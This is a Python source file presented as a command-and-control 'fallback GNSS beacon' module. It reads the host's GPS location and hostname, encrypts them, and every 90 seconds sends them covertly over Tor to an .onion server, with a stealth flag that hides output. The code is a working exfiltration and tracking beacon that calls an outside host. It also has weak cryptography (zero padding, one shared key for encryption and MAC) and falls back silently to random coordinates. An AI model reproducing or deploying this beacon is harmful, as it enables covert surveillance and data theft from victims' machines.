#!/usr/bin/env python3
# File: modules/c2/fallback_gnss_beacon_c2.py

import os
import json
import time
import base64
import random
import socket
import subprocess
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes

# === Configurations ===
CONFIG_PATH = "configs/gnss_beacon_config.json"
KEY_PATH = "secrets/aes_beacon.key"
DROP_PATH = "dropzone/gnss_beacon.dat"
DASHBOARD_ALERTS = "webgui/alerts.json"
LOG_PATH = "logs/fallback_gnss_beacon.log"
FALLBACK_SERVER = "http://fallback-beacon.onion/api/recv"
TOR_PROXY = "socks5h://127.0.0.1:9050"
BEACON_INTERVAL = 90  # seconds
STEALTH_MODE = True

# === Setup Directories ===
for path in [CONFIG_PATH, KEY_PATH, DROP_PATH, DASHBOARD_ALERTS, LOG_PATH]:
    Path(os.path.dirname(path)).mkdir(parents=True, exist_ok=True)

# === Logging ===
def log(msg):
    line = f"[{datetime.utcnow()}] {msg}"
    with open(LOG_PATH, "a") as f:
        f.write(line + "\n")
    if not STEALTH_MODE:
        print(line)

# === Load or Generate AES Key ===
def load_key():
    if not os.path.exists(KEY_PATH):
        key = get_random_bytes(32)
        with open(KEY_PATH, "wb") as f:
            f.write(key)
    else:
        with open(KEY_PATH, "rb") as f:
            key = f.read()
    return key

# === Try GNSS via gpspipe, else simulate ===
def acquire_gnss_coordinates():
    try:
        result = subprocess.check_output(
            ["gpspipe", "-w", "-n", "5"], stderr=subprocess.DEVNULL, timeout=10
        ).decode()
        for line in result.splitlines():
            if '"lat"' in line and '"lon"' in line:
                json_line = json.loads(line)
                return {
                    "lat": round(json_line["lat"], 6),
                    "lon": round(json_line["lon"], 6),
                    "alt": round(json_line.get("alt", 100), 2)
                }
    except Exception:
        pass
    # Fallback
    return {
        "lat": round(random.uniform(-90, 90), 6),
        "lon": round(random.uniform(-180, 180), 6),
        "alt": round(random.uniform(100, 5000), 2)
    }

# === Build Payload ===
def build_payload():
    coords = acquire_gnss_coordinates()
    payload = {
        "timestamp": datetime.utcnow().isoformat(),
        "lat": coords["lat"],
        "lon": coords["lon"],
        "alt": coords["alt"],
        "agent": socket.gethostname()
    }
    return payload

# === AES + HMAC encryption ===
def encrypt_payload(payload, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    raw = json.dumps(payload).encode()
    padded = raw + b"\x00" * (16 - len(raw) % 16)
    ct = cipher.encrypt(padded)
    mac = HMAC.new(key, ct, digestmod=SHA256).digest()
    return base64.b64encode(base64.b64encode(iv + mac + ct)).decode()

# === Write Beacon to File ===
def drop_local_beacon(data):
    with open(DROP_PATH, "w") as f:
        f.write(data)
    log(f"[+] Local GNSS beacon dropped to {DROP_PATH}")

# === Send via Tor Fallback ===
def tor_fallback_beacon(data):
    try:
        import socks
        import urllib3
        from urllib3.contrib.socks import SOCKSProxyManager

        http = SOCKSProxyManager(
            proxy_url=TOR_PROXY,
            num_pools=1,
            timeout=10
        )
        r = http.request("POST", FALLBACK_SERVER,
                         headers={"Content-Type": "application/json"},
                         body=json.dumps({"beacon": data}))
        log(f"[+] Beacon sent via Tor: {r.status}")
    except Exception as e:
        log(f"[!] Tor beacon failed: {e}")

# === Optional: Dashboard Alert ===
def dashboard_alert(payload):
    alert = {
        "timestamp": payload["timestamp"],
        "type": "gnss_fallback_beacon",
        "lat": payload["lat"],
        "lon": payload["lon"],
        "alt": payload["alt"],
        "agent": payload["agent"],
        "channel": "Tor+RF"
    }
    try:
        alerts = []
        if os.path.exists(DASHBOARD_ALERTS):
            with open(DASHBOARD_ALERTS, "r") as f:
                alerts = json.load(f)
        alerts.append(alert)
        with open(DASHBOARD_ALERTS, "w") as f:
            json.dump(alerts, f, indent=2)
    except Exception as e:
        log(f"[!] Failed to alert dashboard: {e}")

# === Main Beacon Loop ===
def main_loop():
    key = load_key()
    while True:
        try:
            payload = build_payload()
            encrypted = encrypt_payload(payload, key)
            drop_local_beacon(encrypted)
            tor_fallback_beacon(encrypted)
            dashboard_alert(payload)
        except Exception as e:
            log(f"[!] Error in beacon cycle: {e}")
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    log("[*] GNSS Fallback Beacon C2 Module Started.")
    main_loop()
